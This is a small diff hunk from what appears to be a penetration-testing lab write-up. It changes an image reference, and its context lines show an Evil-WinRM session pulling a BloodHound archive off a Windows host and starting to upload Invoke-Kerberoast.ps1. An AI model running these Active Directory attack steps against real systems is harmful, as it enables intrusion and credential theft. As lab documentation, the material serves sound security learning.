@@ -683,7 +683,7 @@ Info: Downloading C:\Users\Public\20230926061629_BloodHound.zip to /home/kali/Do
 Info: Download successful!
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ```
 *Evil-WinRM* PS C:\Users\Public> upload /home/kali/Downloads/Invoke-Kerberoast.ps1 
